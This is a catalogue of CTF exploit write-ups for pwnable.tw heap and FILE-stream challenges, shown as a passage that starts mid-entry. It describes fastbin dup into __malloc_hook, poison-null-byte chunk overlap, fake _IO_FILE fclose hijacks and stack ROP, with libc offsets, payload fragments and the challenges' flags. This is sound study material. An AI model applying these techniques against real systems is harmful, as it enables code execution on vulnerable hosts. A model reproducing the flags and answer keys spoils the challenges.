   - Raise D and E with size 0x60 (chunk size 0x70 → fastbin index 5).
   - Remove D, Remove E, Remove D → fastbin: `D → E → D` (circular).
   - Raise with `p64(__malloc_hook - 0x23)` as name → overwrites D's `fd`.
   - Raise twice more to consume E and D.
   - Next 0x70 alloc returns fake chunk at `__malloc_hook - 0x23`.
     - The byte at `__malloc_hook - 0x1b` is the MSB of a libc pointer = `0x7f`, which serves as a valid fake chunk size (0x70 fastbin with IS_MMAPPED set).

3. **Write one_gadget to `__malloc_hook`:**
   - The fake chunk starts 0x23 bytes before `__malloc_hook`.
   - Write `\x00 * 0x13 + p64(one_gadget)` → overwrites `__malloc_hook`.

4. **Trigger:**
   - Double-free any flower → glibc detects corruption → `malloc_printerr` → `abort` backtrace → calls `malloc` → `__malloc_hook` fires → `execve("/bin/sh")`.
   - Alternative: just call Raise (menu 1) again to trigger `malloc`.

**one_gadget offsets (glibc 2.23):**
```python
0x45216   # rax == NULL
0x4526a   # [rsp+0x30] == NULL
0xef6c4   # [rsp+0x50] == NULL  (most commonly used)
0xf0567   # [rsp+0x70] == NULL
```

**Reliability:** Deterministic heap layout. Nearly 100% reliable.

---

##### Path B — Fastbin Dup → Arbitrary Read (Fake Flower Struct) → Stack ROP

**Used by:** Solutions 8, 10, 59, 78, 184, 644, 821 (method 1)

This approach builds an arbitrary read primitive and then overwrites a stack return address.

**Steps:**

1. **Heap Leak via Fastbin:**
   - Raise and remove flowers of the same size to populate fastbins.
   - Raise a new flower whose struct overlaps a freed name → Visit leaks `fd` pointer → heap base.

2. **libc Leak:**
   - Either via unsorted bin (same as Path A), or by using the heap leak + arbitrary read to reach a libc pointer on the heap.

3. **Stack Leak via `environ`:**
   - Use fastbin dup to create overlapping flower struct + name buffer.
   - Forge a fake flower struct where `name` points to `libc.sym['environ']`.
   - Visit → prints contents of `environ` → stack address.

4. **Fastbin Dup to Stack:**
   - Find a stack address where `[addr+8]` contains `0x7f` (a valid fastbin size byte). Typically at `environ_value - 0x18b` or similar offset.
   - Double-free 0x70-size chunks, plant fake `fd` pointing to that stack address.
   - Final alloc returns a buffer on the stack.
   - Write a ROP chain (`pop rdi; ret` → `/bin/sh` → `system`) overwriting `read()`'s return address (since the name buffer `read()` call returns into the vulnerable stack frame).

**Reliability:** Deterministic. Does not require one_gadget constraints.

---

##### Path C — Fastbin Dup → `_IO_list_all` / `stdout` vtable Hijack

**Used by:** Solutions 78 (variant), 138, 278, 365, 370 (variant), 100, 1172, 1236

This approach targets the FILE stream vtable mechanism in glibc 2.23.

**Steps:**

1. **libc + Heap Leak:** Same as Path A/B.

2. **Fastbin Dup into `_IO_list_all` or `stdout`:**
   - Target `_IO_list_all - 0x23` (has a `0x7f` size byte) or `stdout + 0xd8 - 0x3b` (similar).
   - Double-free 0x70 chunks, plant fake `fd` to the target.

3. **Overwrite `_IO_list_all`** to point to a controlled heap region containing:
   - A crafted fake `_IO_FILE` struct with specific field constraints.
   - A fake vtable where the `__overflow` / `xsputn` function pointer = `one_gadget` or `system`.

4. **Trigger via `exit(0)` (menu 5) or `abort`:**
   - `exit` → `__run_exit_handlers` → `_IO_cleanup` → `_IO_flush_all_lockp` → walks `_IO_list_all` → calls vtable function → one_gadget/system.
   - Or: any malloc error (double-free) → `malloc_printerr` → `abort` → `_IO_flush_all_lockp` → same path.

**Reliability:** Requires careful struct crafting. Works on glibc 2.23 (vtable checks not yet enforced).

---

##### Path D — Fastbin Dup → `main_arena` Top Chunk Overwrite → `__free_hook`

**Used by:** Solution 550

An unusual approach that overwrites `main_arena.top` to redirect future allocations.

**Steps:**

1. **Leak libc + heap** via UAF.
2. **Fastbin dup into `main_arena`** (using a heap address with a valid size byte in the right position).
3. **Overwrite `main_arena.top`** with `__free_hook - 0xb58` (an address with non-zero data serving as the new top chunk's size).
4. **Repeatedly allocate** to advance the top chunk toward `__free_hook`.
5. **Overwrite `__free_hook`** with `system`.
6. **Free a chunk** containing `"/bin/sh"` → `system("/bin/sh")`.

**Reliability:** Works but requires many allocations to reach `__free_hook`. Fragile.

---

##### Path E — Unsorted Bin Attack → `global_max_fast` → Large Fastbin → `__free_hook`

**Used by:** Solution 821 (method 1)

1. **Unsorted bin attack** to write `main_arena+0x58` to `global_max_fast`, making all chunk sizes treated as fastbins.
2. **Free a large chunk** → it goes into a "fastbin" slot that maps to a useful address.
3. **Allocate from that fastbin** to get a chunk near `__free_hook`.
4. **Overwrite `__free_hook`** with `system`.

**Reliability:** Complex setup, less commonly used.

---

##### Path F — `__realloc_hook` + `__malloc_hook` Combo

**Used by:** Solutions 2311, 2605

A variant of Path A that handles one_gadget constraint failures:

1. Same fastbin dup to `__malloc_hook - 0x23`.
2. Write `one_gadget` to `__realloc_hook` and `__libc_realloc + 20` to `__malloc_hook`.
3. When `malloc` is called → `__malloc_hook` → `__libc_realloc(+20)` → `__realloc_hook` → `one_gadget`.
4. The extra `realloc` stack frame adjusts `rsp` alignment so the one_gadget constraints are satisfied.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| libc leak (unsorted bin fd/bk) | V1: UAF read after free into unsorted bin | Deterministic |
| Heap leak (fastbin fd) | V1: UAF read after free into fastbin | Deterministic |
| Fastbin duplication | V1: double-free same name buffer | Deterministic |
| Arbitrary write (fastbin dup) | Fake fd → alloc at target address | Deterministic (needs valid size byte) |
| Stack leak | Arbitrary read via forged flower struct → `environ` | Deterministic after arb read |
| Code execution | `__malloc_hook`, `__free_hook`, vtable, or stack ROP | Deterministic |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `8.md` | B | fastbin dup → stack ROP via environ leak | Full arbitrary read chain; leaks heap, libc, stack, canary |
| `10.md` | B | fastbin dup → stack ROP via TLS/mmap leak | Unusual: leaks libc via TLS region from mmap'd chunk |
| `59.md` | B | fastbin dup → stack ROP | Clean approach; leaks libc, stack via environ |
| `60.md` | B | unsorted bin split → stack ROP | Leaks libc via remainder chunk metadata |
| `78.md` | C | fastbin dup → `_IO_2_1_stdout_` vtable | Overwrites stdout vtable pointer to fake vtable |
| `100.md` | C | fastbin dup → `_IO_list_all` → exit trigger | Crafts fake IO stream, triggers via exit(0) |
| `138.md` | C | fastbin dup → `_IO_list_all` | Ruby exploit; IO_flush_all to one_gadget |
| `184.md` | B | fastbin dup → stack ROP via `__libc_argv` | Leaks stack from __libc_argv instead of environ |
| `278.md` | C | fastbin dup → stdout vtable hijack | Overwrites stdout vtable to fake vtable with one_gadget |
| `331.md` | A | unsorted bin leak → fastbin dup → `__malloc_hook` | First doubles as libc+heap leak then overwrites malloc_hook |
| `365.md` | C | fastbin dup → `_IO_list_all` + fake IO | Constructs full fake FILE struct on heap |
| `370.md` | A | fastbin dup → `__malloc_hook` via IO_list vtable | Variant: overwrites IO stdout vtable to one_gadget |
| `550.md` | D | fastbin dup → `main_arena.top` overwrite → `__free_hook` | Unusual: hijacks top chunk to reach __free_hook |
| `644.md` | B | fastbin dup → stack ROP via environ | Classic: leak stack, ROP into read() return address |
| `821.md` | E + A | unsorted bin attack → `global_max_fast` + fastbin → `__free_hook` | Three different exploit methods in one writeup |
| `1172.md` | A | fastbin dup → `__malloc_hook` | Concise; standard approach |
| `1236.md` | A | fastbin dup → `_IO_2_1_stdout_` vtable | Overwrite stdout vtable to one_gadget |
| `1351.md` | C | fastbin dup → stdout vtable | Ruby; one_gadget via vtable |
| `2311.md` | F | fastbin dup → `__realloc_hook` + `__malloc_hook` combo | Uses realloc to fix rsp alignment for one_gadget |
| `2605.md` | A | fastbin dup → `__malloc_hook` | Standard approach with detailed heap manipulation |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (fastbin dup → `__malloc_hook` → one_gadget) |
| `desc.txt` | Challenge description |
| `artifacts/` | Original challenge binary + libc |
| `solution/*.md` | Community write-ups (128 solutions) |

## secret_of_my_heart
> **Canonical route:** Post-read NUL at capacity index → Next-chunk size poison, backward consolidation/overlap, fastbin hook, predictable mmap, or stack ROP
> **Read this case when:** Exact-size reads append NUL at `buf[size]` and a hidden command reveals the base.
> **Primary defect:** Post-read NUL at capacity index
> **Exploit primitive/result:** Next-chunk size poison, backward consolidation/overlap, fastbin hook, predictable mmap, or stack ROP
> **Search terms:** heart; off-by-null; `read_n`; backward consolidation; `srand(time(0))`; hidden `4869`
> **Version/protection clue:** Case target `secret_of_my_heart` — x86-64, glibc 2.23, Full RELRO, canary/NX/PIE
> **Variant boundary:** Standalone; the hidden base reveal and exact-size NUL are prerequisites.

### Metadata

- Source title: Secret Of My Heart — pwnable.tw (400 pts)
- Source callout: `nc chall.pwnable.tw 10302`
- Source note: >
- Source callout: Flag: `FLAG{It_just_4_s3cr3t_on_the_h34p}`

```yaml
tags:
  - off-by-null
  - heap-consolidation
  - fastbin-dup
platform: pwnable.tw
points: 400
arch: x86-64
libc: glibc-2.23
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "An off-by-null byte in secret note creation allows clearing the prev_inuse bit, triggering backward heap consolidation into an active chunk to overwrite __malloc_hook."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A heap menu binary (x86-64, Full RELRO, PIE, NX, Canary) built against glibc 2.23. The player can add, show, and delete "secrets". Each secret metadata struct (0x30 bytes) lives in a random `mmap`'d region (seeded by `srand(time(0))`); its content buffer is `malloc`'d on the main heap. Max content size is 0x100, no edit primitive.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO         # GOT not writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
```

#### Key Data Structures

##### Secret Struct (0x30 bytes, in mmap region)

```c
struct heart {            // 0x30 bytes, at mmap'd address
    size_t size;          // +0x00
    char   name[0x20];   // +0x08   read 0x20 bytes, NO NUL terminator
    char  *secret;        // +0x28   malloc(size), on main heap
};
```

The secret metadata array is at a random `mmap`'d address. Up to 100 entries. The `secret` pointer points to a `malloc`'d heap chunk where the actual content is stored.

#### Vulnerabilities

##### V1 — Off-by-One NULL Byte (Poison Null Byte) — Primary

**Root Cause:** When creating a secret, content is read with `read_n(buf, size)` and then a NUL terminator is placed at `buf[bytes_read]`. If exactly `size` bytes are sent (no trailing newline), `bytes_read == size`, so a NUL byte is written at `buf[size]` — one byte past the allocated region.

```c
// ADD function (decompiled)
chunk[5] = (size_t)malloc(size);
printf("secret of my heart :");
result = (_BYTE *)(chunk[5] + (int)read_F((void *)chunk[5], size));
*result = 0;   // <-- off-by-one NULL at buf[size]
```

**Impact:** When `size == chunksize - 8` (e.g., `size = 0xf8` → chunk `0x100`, or `size = 0x88` → chunk `0x90`), the NUL byte overwrites the **lowest byte of the next chunk's size field**, clearing its `prev_inuse` bit (`0x101 → 0x100`). This is the classic **poison null byte** primitive enabling heap chunk overlapping via backward consolidation.

##### V2 — Name Info Leak (Heap Pointer)

**Root Cause:** The `name` field is read with `read_F(name, 0x20)` which does **not** NUL-terminate. The `name[0x20]` buffer is immediately followed by the `secret` pointer (a heap address). `Show` uses `printf("Name : %s\n", name)` which reads past the 0x20 bytes into the heap pointer.

```c
printf("Name : %s\n", (const char *)(unk_202018 + 48LL * idx + 8));
//                     name[0x20] || secret_ptr  ← leaked
```

**Impact:** Fill name with 0x20 non-NUL bytes → `Show` leaks the `secret` heap pointer → **heap base**.

##### V3 — Predictable mmap Address (`srand(time(0))`)

**Root Cause:** The secret metadata array address is derived from `rand() & 0xfffff000` seeded with `srand(time(0))`. An attacker can predict this by calling `srand(time(0))` locally at the same time.

```c
srand(time(0));
do { addr = rand() & 0xfffff000; } while (addr <= 0x10000);
secrets = mmap(addr, ...);
```

**Impact:** Knowing the mmap base lets attackers craft fake chunks in the metadata region and perform fastbin attacks targeting it (e.g., overwriting a secret's `secret` pointer to achieve arbitrary read/write).

##### V4 — Hidden Command (0x1305)

Sending `4869` (= `0x1305`) as the menu choice prints the mmap base address and exits. Not useful in practice since it terminates the connection, but confirms the mmap address.

#### Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
__malloc_hook   = 0x3c3b10
__realloc_hook  = 0x3c3b08
__free_hook     = 0x3c57a8
__libc_realloc  = 0x83b10
main_arena + 88 = 0x3c3b78   # unsorted bin fd leak value
system          = 0x45390
environ         = 0x3c5f38
bin_sh          = 0x18c177
_IO_list_all    = 0x3c4520
stdout          = 0x3c4620

# Fake fastbin chunk for __malloc_hook
fake_chunk      = __malloc_hook - 0x23   # *(fake+8) = 0x7f from adjacent relocation

# one_gadgets
one_gadgets     = [0x4526a, 0xef6c4, 0xf0567]

# realloc trick offsets (realloc + N skips N bytes of push prologue)
realloc_offsets = [0x0, 0x2, 0x4, 0x6, 0xb, 0xc, 0xd]
# Winning combo: __malloc_hook = realloc+0xc, __realloc_hook = 0x4526a
```

### Exploit Paths

#### Exploit Paths

All solutions use V1 (poison null byte) for chunk overlapping. They diverge on the specific heap layout, leak strategy, and final hijack target.

---

##### Path A — Poison Null Byte → Chunk Overlap → Unsorted Bin Leak → Fastbin Dup → `__malloc_hook`

**Used by:** ~80% of solutions (exp.py, 8153, 13204, 25916, 34817, 37983, 7905, 18331, etc.)

This is the dominant approach:

1. **Leak heap base (V2):** Allocate a secret with name filled to 0x20 bytes. `Show` leaks the adjacent `secret` pointer → derive heap base.

2. **Poison null byte (V1):** Allocate chunks A, B, C in sequence. Free B, then free and re-allocate A with `size = chunksize-8` bytes to trigger the off-by-one NULL, clearing B's `prev_inuse` bit in C's size field. Place a fake `prev_size` in the padding so that `free(C)` triggers backward consolidation, merging C with B and creating a large free chunk that **overlaps** a still-allocated small chunk D (allocated between B and C before freeing).

3. **Leak libc:** The overlapping chunk D's data now coincides with freed unsorted bin metadata. `Show(D)` reads the `fd` pointer → `main_arena + 0x58` → subtract offset → **libc base**.

4. **Fastbin dup / fastbin attack:** Using the overlap, modify a freed fastbin chunk's `fd` to point to `__malloc_hook - 0x23` (the classic 0x7f size trick in glibc 2.23). After two `malloc(0x68)` calls, the third returns a pointer near `__malloc_hook`.

5. **Overwrite `__malloc_hook`:**
   - **Simple:** Write `one_gadget` directly to `__malloc_hook`.
   - **Realloc trick:** Write `one_gadget` to `__realloc_hook` and `realloc + offset` to `__malloc_hook`. When malloc fires, it jumps to realloc which adjusts `rsp` (via extra `push` instructions) before `call __realloc_hook`, satisfying the one_gadget's `[rsp+0x30]==NULL` constraint.

6. **Trigger:** Any operation that calls `malloc` (e.g., add a new secret, or trigger `malloc_printerr` via double-free) → one_gadget → shell.

**Realloc hook trick detail:**

```python
# user data starts at __malloc_hook - 0x13
payload = b'\x00' * 0x0b       # padding to reach __realloc_hook
payload += p64(one_gadget)      # __realloc_hook
payload += p64(realloc + 0xc)   # __malloc_hook
# Flow: malloc → jmp __malloc_hook (= realloc+0xc)
#       → push rbx; sub rsp,0x38; ... call __realloc_hook
#       → one_gadget with adjusted rsp
```

---

##### Path B — Poison Null Byte + Predictable mmap (V3) → Fastbin to mmap Region → Arbitrary R/W

**Used by:** Solutions 370, 8, 59, 821, 1303, 2277, 3498, 34817

This variant uses the predictable mmap address to craft fake chunks in the metadata region:

1. **Predict mmap base (V3):** Call `srand(time(0)); rand() & 0xfffff000` locally.

2. **Leak heap base (V2):** Same as Path A.

3. **Poison null byte → overlap:** Same as Path A.

4. **Fastbin attack targeting mmap region:** Point a corrupted fastbin `fd` at the mmap metadata area (which contains the secret structs). After malloc returns a chunk in the metadata region, overwrite a secret struct's `secret` pointer to point at an arbitrary address.

5. **Arbitrary read:** Point `secret` at a heap address containing unsorted bin `fd` → `Show` leaks libc.

6. **Arbitrary write:** Point `secret` at `__malloc_hook`, `__free_hook`, or `__environ` → overwrite or leak as needed.

7. **Hijack:**
   - `__free_hook = system` → free a secret containing `"/bin/sh"`.
   - `__malloc_hook = one_gadget` → trigger malloc.

---

##### Path C — Poison Null Byte → Stack Leak via `__environ` → ROP on Stack

**Used by:** Solutions 8, 59, 3498

1. **Same overlap + libc leak** as Path A/B.
2. **Leak stack:** Point a secret's `secret` pointer at `libc.__environ` → `Show` leaks a stack address.
3. **Fastbin attack on stack:** Use the stack address to find a 0x7f byte near the return address of `read_n()`. Place a fake fastbin chunk there.
4. **ROP chain:** Overwrite `read_n()`'s return address with `pop rdi; ret; "/bin/sh"; system`.

---

##### Path D — House of Orange / FSOP (`_IO_list_all` overwrite)

**Used by:** Solutions 138, 278, 1006

Instead of targeting hooks, this approach corrupts the `_IO_list_all` / `_IO_2_1_stdout_` vtable:

1. **Same overlap + libc leak.**
2. **Fastbin attack targeting `stdout`:** Overwrite the FILE struct's vtable pointer to a fake vtable on the heap containing `system` or `one_gadget` in the `xsputn` slot.
3. **Trigger:** Any `printf`/`puts` call invokes the corrupted vtable → shell.

Alternatively, corrupt `_IO_list_all` to point to a fake FILE struct on the heap with `system` as the overflow handler, then trigger `malloc_printerr` → `_IO_flush_all_lockp` → shell.

---

##### Path E — House of Einherjar (Direct)

**Used by:** Solutions 821, 3498

Uses the poison null byte differently — rather than standard backward consolidation, carefully crafts `prev_size` so that consolidation merges chunks all the way back to a fake chunk placed in the mmap metadata region or at a controlled heap address, allowing direct control of allocations at arbitrary locations.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Off-by-one NULL byte | V1: `buf[size] = 0` in add | Deterministic |
| Heap base leak | V2: name[0x20] not NUL-terminated | Deterministic |
| mmap base prediction | V3: `srand(time(0))` | ~1s timing window |
| Chunk overlapping | V1 + backward consolidation | Deterministic |
| libc leak (unsorted bin fd) | Overlapping chunk reads freed metadata | Deterministic |
| Fastbin dup / poisoning | Overlapping → double view of same chunk | Deterministic |
| `__malloc_hook` write | Fastbin attack to `malloc_hook - 0x23` | Deterministic |
| Code execution | `one_gadget` via `__malloc_hook` or `__free_hook` | Deterministic |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `370.md` | B | mmap predict + fastbin to mmap → vtable attack | `_IO_2_1_stdout_` vtable overwrite |
| `8.md` | B + C | mmap predict + fastbin → environ → stack ROP | Full chain: heap → libc → stack |
| `59.md` | B + C | mmap predict + poison null → environ → stack ROP | Uses numpy for rand prediction |
| `138.md` | D | House of Orange / FSOP via `_IO_list_all` | Ruby exploit; fake FILE struct |
| `278.md` | D | Fastbin → stdout vtable overwrite | Ruby; corrupts `_IO_2_1_stdout_` |
| `550.md` | A | Poison null → overlap → unlink → libc → fastbin → `__free_hook` | Classic unlink + top chunk trick |
| `821.md` | B + E | mmap predict + House of Einherjar → `__free_hook` | Two-script setup for rand server |
| `1006.md` | A | Poison null → overlap → fastbin dup → `__malloc_hook` | Standard with heap leak first |
| `1303.md` | B | mmap predict → fastbin to mmap → `__malloc_hook` | C helper for srand/rand |
| `2277.md` | B | mmap predict → fastbin to mmap → `__free_hook` | Uses unsorted bin attack |
| `3498.md` | B + E | mmap predict + Einherjar → fastbin → `__free_hook` | Detailed struct analysis |
| `7905.md` | A | Poison null → overlap → unlink → libc leak → fastbin → `__malloc_hook` | Clean structured exploit |
| `8153.md` | A | Poison null → overlap → fastbin dup → `__malloc_hook` | Realloc hook trick |
| `13204.md` | A | Poison null → overlap → `__malloc_hook` + one_gadget | Detailed writeup (Chinese) |
| `18331.md` | A | Standard poison null → fastbin → `__malloc_hook` | Concise |
| `25916.md` | A | Poison null → overlap → fastbin → `__malloc_hook` | Double-free trigger |
| `34817.md` | B + A | mmap predict + poison null → fastbin → `__malloc_hook` | Realloc trick |
| `37983.md` | B + E | mmap predict + Einherjar → alloc to mmap → `__malloc_hook` | Realloc trick, detailed comments |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (self-contained, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/secret_of_my_heart` | Original challenge binary (stripped, PIE) |
| `artifacts/libc_64.so.6` | Remote libc (glibc 2.23) |
| `solution/*.md` | Community write-ups (99 solutions) |

## seethefile
> **Canonical route:** Exit-path `scanf` overwrites global `FILE *fp` → Fake `_IO_FILE_plus` consumed by `fclose` and vtable `system` execution
> **Read this case when:** A file-viewer blocks `flag` in names but allows `/proc/self/maps`, then exits through attacker-influenced `fclose`.
> **Primary defect:** Exit-path `scanf` overwrites global `FILE *fp`
> **Exploit primitive/result:** Fake `_IO_FILE_plus` consumed by `fclose` and vtable `system` execution
> **Search terms:** seethefile; fake FILE; `_IO_FILE_plus`; `fclose`; vtable; `/proc/self/maps`
> **Version/protection clue:** Case target `seethefile` — i386, glibc 2.23, Partial RELRO, canary/NX, no PIE
> **Variant boundary:** Standalone; preserve exact fake-FILE validation fields and read maps before losing the descriptor.

### Metadata

- Source title: seethefile — pwnable.tw (400 pts)
- Source callout: `nc chall.pwnable.tw 10200`
- Source note: >
- Source callout: Flag: `FLAG{F1l3_Str34m_is_4w3s0m3}`

```yaml
tags:
  - io-file-exploit
  - vtable-hijack
  - arbitrary-write
platform: pwnable.tw
points: 400
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "Closing a fake _IO_FILE structure forged in the BSS segment hijacks the file vtable pointer during fclose, redirecting execution to system."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A 32-bit file viewer binary (i386, No PIE, Partial RELRO, NX, Stack Canary) built against glibc 2.23. The program presents a menu to open, read, print, and close files. On exit it asks for a name and calls `fclose(fp)` on a global FILE pointer. The flag file cannot be opened directly (filename filter blocks "flag").

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)   # fixed addresses in .bss
```

##### Binary Layout (BSS)

```
0x804B080  filename[64]     — stores the filename from openfile()
0x804B0C0  magicbuf[400]    — fread() destination buffer
0x804B260  name[32]         — scanf("%s", name) destination on exit
0x804B280  fp               — global FILE* pointer
```

##### Menu Functions (IDA decompile)

```c
// main loop
while (1) {
    menu();
    scanf("%s", v8);          // stack buffer, reads menu choice
    switch (atoi(v8)) {
    case 1: openfile(); break;
    case 2: readfile(); break;
    case 3: writefile(); break;
    case 4: closefile(); break;
    case 5:
        printf("Leave your name :");
        scanf("%s", name);    // <-- V1: unbounded write to BSS
        printf("Thank you %s ,see you next time\n", name);
        if (fp) fclose(fp);   // <-- V2: fclose on attacker-controlled fp
        exit(0);
    }
}

void openfile() {
    scanf("%63s", filename);
    if (strstr(filename, "flag")) { puts("Danger !"); exit(0); }
    fp = fopen(filename, "r");
}

void readfile() {
    memset(magicbuf, 0, 400);
    fread(magicbuf, 399, 1, fp);
}

void writefile() {
    if (strstr(filename, "flag") || strstr(magicbuf, "FLAG") || strchr(magicbuf, '}'))
        { puts("you can't see it"); exit(1); }
    puts(magicbuf);
}

void closefile() {
    if (fp) fclose(fp);
    fp = 0;
}
```

#### Vulnerabilities

##### V1 — `scanf("%s", name)` Buffer Overflow on BSS (Primary)

**Root Cause:** The exit handler reads the user's name with `scanf("%s", name)` where `name` is a 32-byte BSS buffer at `0x804B260`. `scanf("%s")` has **no length limit** — it writes until whitespace.

```c
// Exit path in main
printf("Leave your name :");
scanf("%s", name);    // name = 0x804B260, 32 bytes
// ...
if (fp) fclose(fp);   // fp = 0x804B280 = name + 0x20
```

**Impact:** Writing >32 bytes overwrites the global `FILE *fp` at `0x804B280`. The attacker can point `fp` to an arbitrary address — including right after itself in BSS, where the overflow payload continues with a **fake `_IO_FILE_plus` struct**.

##### V2 — `fclose()` on Attacker-Controlled `FILE*` (FSOP)

**Root Cause:** After the overflow, `fclose(fp)` operates on the attacker-forged `FILE*`. In glibc 2.23 (no vtable validation), `fclose` dispatches through the struct's vtable pointer. By crafting a fake `_IO_FILE_plus` with a fake vtable, the attacker redirects a virtual call (typically `_IO_FINISH` or `__close`) to `system()`.

The glibc 2.23 `_IO_new_fclose` flow:

```c
int _IO_new_fclose(FILE *fp) {
    if (_IO_vtable_offset(fp) != 0)     // fp+0x46 must be 0
        return _IO_old_fclose(fp);
    if (fp->_flags & _IO_IS_FILEBUF)    // clear bit 0x2000 to skip
        _IO_un_link(fp);
    _IO_acquire_lock(fp);               // fp->_lock (fp+0x48) dereferenced
    // ...
    _IO_FINISH(fp);                     // *(*(fp+0x94) + 0x8)(fp)
    // ...
}
```

**Key constraints for the fake struct:**
- `fp+0x46` (`_vtable_offset`) must be `0` — avoids `_IO_old_fclose` path
- `fp->_flags` must have `_IO_IS_FILEBUF` (0x2000) cleared — skips `_IO_un_link` and `_IO_file_close_it`
- `fp+0x48` (`_lock`) must point to zeroed writable memory — lock acquisition dereferences it
- `fp+0x94` (`vtable`) must point to a fake vtable where offset `+0x8` (`__finish`) = `system`

When `_IO_FINISH(fp)` fires, it calls `system(fp)`. Since `fp` points to the start of the fake struct, placing `";/bin/sh;"` at the beginning makes `system` execute it (the leading garbage before `;` errors out harmlessly).

##### V3 — Information Leak via `/proc/self/maps`

**Root Cause:** The filename filter only blocks `"flag"`, not `/proc/self/maps`. Opening and reading this file dumps the full memory map including libc's base address.

```c
if (strstr(filename, "flag")) { ... }  // only blocks "flag"
// /proc/self/maps is allowed
```

**Impact:** Deterministic libc base leak. The `writefile` function also filters for `"FLAG"` and `}` in the read buffer, but `/proc/self/maps` output doesn't contain those strings.

#### Key Data Structures

##### `_IO_FILE` (glibc 2.23, i386 — 0x94 bytes + vtable pointer)

| Offset | Field | Notes for exploit |
|--------|-------|-------------------|
| `0x00` | `_flags` | Set to `0xFFFFDFFF` (clears `_IO_IS_FILEBUF` bit 0x2000) |
| `0x04` | `_IO_read_ptr` | Part of `";/bin/sh;"` command string |
| `0x08` | `_IO_read_end` | Continuation of shell command |
| `0x0C` | `_IO_read_base` | Can be zero or continuation |
| `0x10`–`0x30` | I/O buffer pointers | Typically zeroed |
| `0x34` | `_chain` | Can be zero |
| `0x38` | `_fileno` | Can be zero |
| `0x44` | `_cur_column` / `_vtable_offset` | **`_vtable_offset` at +0x46 must be 0** |
| `0x48` | `_lock` | **Must point to zeroed writable memory** |
| `0x4C` | `_offset` | Can be `0xFFFFFFFF` |
| `0x94` | `vtable` | **Points to fake vtable** |

##### Fake Vtable (`_IO_jump_t`)

| Offset | Field | Value |
|--------|-------|-------|
| `0x00` | `__dummy` | 0 |
| `0x04` | `__dummy2` | 0 |
| `0x08` | `__finish` | **`system`** ← called by `_IO_FINISH(fp)` |
| `0x0C+` | remaining entries | `system` (spray for reliability) |

#### Offsets (pwnable.tw `libc_32.so.6`, glibc 2.23)

```python
system      = 0x3A940
exit        = 0x2E7B0
bin_sh      = 0x158E8B
_IO_file_jumps = <libc_base + offset>  # real vtable (for reference)
```

#### BSS Addresses (No PIE)

```python
filename    = 0x0804B080   # 64 bytes
magicbuf    = 0x0804B0C0   # 400 bytes
name        = 0x0804B260   # 32 bytes — overflow source
fp          = 0x0804B280   # FILE* — overflow target
# Fake struct typically at 0x804B284 or 0x804B290
```

### Exploit Paths

#### Exploit Paths

All 146 solutions follow essentially the same approach with minor variations in the fake struct layout.

---

##### Path A — `/proc/self/maps` Leak → FSOP `fclose` → `system("/bin/sh")` (Standard)

**Used by:** Virtually all solutions (370, 385, 654, 799, 823, 1395, 1689, 1922, 2903, 9418, 9871, 14605, 16806, 26585, 28356, 34604, 36233, 37983, etc.)

**Steps:**

1. **Leak libc base:** Open `/proc/self/maps`, read + write to screen. Parse the libc mapping line to get the base address. Some solutions need two reads (the 399-byte `fread` buffer may not reach the libc line in one go).

2. **Compute `system` address:** `system = libc_base + 0x3A940` (for the challenge's glibc 2.23).

3. **Craft the FSOP payload:** On exit, `scanf("%s", name)` writes starting at `0x804B260`:

```
+0x00: padding (32 bytes) — fills name[32]
+0x20: p32(fake_fp_addr)  — overwrites fp to point to fake struct
+0x24: fake _IO_FILE_plus  — starts here (or at +0x24)
  +0x00: flags = 0xFFFFDFFF (or similar, _IO_IS_FILEBUF cleared)
  +0x04: ";/bin/sh;" (system argument via fp pointer)
  ...
  +0x48: _lock → zeroed BSS (e.g. 0x804B0A0 or 0x804B260+offset)
  ...
  +0x94: vtable → fake_vtable_addr
fake_vtable:
  +0x08: system address
```

4. **Trigger:** After `scanf` returns, `fclose(fp)` processes the fake struct, eventually calling `_IO_FINISH(fp)` which resolves to `system(fp)`. Since `fp` points to memory starting with `";/bin/sh;"`, the shell spawns.

5. **Get flag:** `echo 'Give me the flag' | /home/seethefile/get_flag`

**Reliability:** ~100% deterministic. The only failure case is if `system`'s address contains a whitespace byte (`\x09`, `\x0a`, `\x0b`, `\x0c`, `\x0d`, `\x20`) which would terminate `scanf("%s")`. This is ASLR-dependent and can be retried.

---

##### Path A Variant — Redirect `__close` Instead of `__finish`

**Used by:** Solutions 799, 1236, 1902

Some solutions target a different vtable slot. Instead of `_IO_FINISH` (vtable+0x08), they arrange the fake struct so `_IO_SYSCLOSE` → `system` fires through the `__close` slot (vtable+0x44). The principle is identical — just a different offset in the fake vtable.

---

##### Path A Variant — Format String via Fake `fread`

**Used by:** Solution 331, 1006

A creative two-stage approach:
1. First exit: craft a fake FILE struct where `fread` → `printf` (redirect vtable read to printf). This leaks a libc address from the stack via format string (`%6$x`).
2. Return to `main` (by setting the vtable's finish/close entry to `main`).
3. Second exit: now with libc known, craft the real FSOP payload with `system`.

This avoids needing `/proc/self/maps` for the leak but is more complex.

---

##### Path A Variant — `add_esp` Gadget → Stack Pivot

**Used by:** Solution 1236

Instead of directly calling `system` through the vtable, uses a `add esp, X; ret` libc gadget to pivot execution onto the BSS payload area, then chains `system("/bin/sh")` via a ROP-style sequence. More complex but demonstrates that the vtable hijack gives arbitrary code execution, not just one-shot `system`.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
